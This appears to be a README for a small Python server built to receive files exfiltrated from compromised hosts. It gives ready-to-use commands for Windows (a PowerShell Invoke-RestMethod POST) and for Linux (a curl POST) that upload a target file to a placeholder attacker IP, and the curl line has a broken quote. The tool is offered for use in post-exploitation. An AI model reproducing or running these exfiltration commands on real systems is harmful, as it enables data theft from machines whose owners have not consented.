# httpInvokeDownload
Small Python Server used to download files from a compromised host.

Run this server, then on your compromised windows host, run `Invoke-RestMethod -URI http://*attacker_ip*/*vercode*/*filename* -Method Post -InFile ”*target_file*”`. If you've compromised a Linux host, run `curl -X post -d "$(cat *target_file*) http://*attacker_ip*/*vercode*/*filename*.
